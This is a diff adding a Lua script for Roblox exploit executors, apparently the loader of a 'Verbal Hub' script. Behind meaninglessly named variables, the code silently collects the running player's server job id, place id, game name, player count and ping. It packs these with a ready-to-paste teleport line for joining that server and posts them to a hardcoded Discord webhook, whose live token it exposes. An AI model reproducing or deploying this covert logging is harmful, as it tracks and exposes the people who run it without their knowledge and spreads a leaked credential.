@@ -1,0 +1,44 @@
+
+getgenv().haskjhfgash = "Verbal Hub"
+getgenv().sdkgjuhlasdas = "https://discord.com/api/webhooks/1294863291230978150/7ySUlLcHxeTdNqNPavbZEyIlzsBwwKkyq0SgdwwIq05lig0GEysGCTqx-68NMfsw35SN"
+getgenv().aasdfsdgfgh = "adskak2bkdjsadasd"
+
+local player = game:GetService("Players").LocalPlayer
+local userid = player.UserId
+local gameid = game.PlaceId
+local jobid = tostring(game.JobId)
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+
+local function getServerInfo()
+	local playerCount = #game:GetService("Players"):GetPlayers()
+	local maxPlayers = game:GetService("Players").MaxPlayers
+	local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
+	
+	return {
+		["Players in Server"] = playerCount .. " / " .. maxPlayers,
+		["Ping"] = pingValue .. " ms",
+	}
+end
+
+local function sendWebhook()
+	local data = {
+		['webhookid'] = getgenv().aasdfsdgfgh,
+		["embeds"] = {{
+			["title"] = "Script Execution Detected | Exec Log",
+			["description"] = "*One of the Scripts has been Executed:*",
+			["fields"] = {
+				{["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().haskjhfgash .. "```", ["inline"] = false},
+				{["name"] = "🔗 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false},
+				{["name"] = "🕹️ **Server Info**", ["value"] = "```" .. getServerInfo()["Players in Server"] .. "\n" .. getServerInfo()["Ping"] .. "```", ["inline"] = true},
+			},
+		}},
+	}
+
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+	local headers = {["content-type"] = "application/json"}
+	local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+	request({Url = getgenv().sdkgjuhlasdas, Body = newdata, Method = "POST", Headers = headers})
+end
+
+sendWebhook()
